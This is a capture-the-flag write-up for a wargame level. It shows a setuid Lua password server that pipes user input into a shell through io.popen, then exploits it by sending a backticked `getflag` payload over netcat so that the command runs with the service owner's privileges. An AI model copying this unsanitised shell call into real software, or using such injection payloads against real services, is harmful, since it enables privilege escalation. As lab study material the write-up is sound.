# level11 - Command injection - Exploit lua script

## Enumeration

```shell
ps aux | grep flag11
```

<br>

## Summary

on our `HOME` (`/home/user/level11`), we find  a binary (`level11`) with the flag11 user's **suid set**.

```shell
~:/home/user/level11$ ls -l

-r~sr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua

~:/home/user/level11$ cat /home/user/level11

#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end

~$ ps aux | grep flag11

flag11    1825  0.0  0.0   3032   984 ?        S    14:41   0:00 lua /home/user/level11/level11.lua
level11   2829  0.0  0.0   4352   524 pts/0    S+   16:14   0:00 grep --color=auto flag11

```

As we can see, the binary is a server which is already running by flag11.
So any vulnerability in the script will run with flag11’s privilege.

<br>

The vulnerability seems to be the decoding of the code encoded by the SHA-1 hash, but is a fake news… the real vulnerability is indeed what we input in the program, in particular the hash() function, which executes (with flag11 privileges): `echo <input password> | sha1sum` . Here is the real vulnerability.

<br>

## Exploit

Thus, a simple ``echo `getflag` > /tmp/token11`` then reading the token11 file allows us to discover the password, whatever the real password.

```shell
~$ nc localhost 5151

Password: `getflag` > /tmp/token11
Erf nope..

~$ cat /tmp/token11

Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

<br>

But as we are curious, we want to discover for the glory that the password 
is hidden behind the SHA-1: `f05d1d066fb246efe0c6f7d095f909a7a0cf34a0` (see 
file `level11.lua` above). So, just google it figured out that the pass is 
`NotSoEasy` … but when we try it, it isn’t work. It’s because the command 
**echo** add a new line to  the password before passed it through command 
**sha1sum**. A simple **echo -n** and we’ve done !

```shell
~$ nc localhost 5151

Password: `getflag` > /tmp/token11 ; echo -n NotSoEasy
Gz you dumb*

>$ cat /tmp/token11

Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

> To expoit this vunerability, you can use the python script provides in the level repository. Copy it in file `/tmp` and run it : `python /tmp/exploit11.py`

> On this exploit, we ran directly command getflag from flag11's user. So, just log on level12 user.
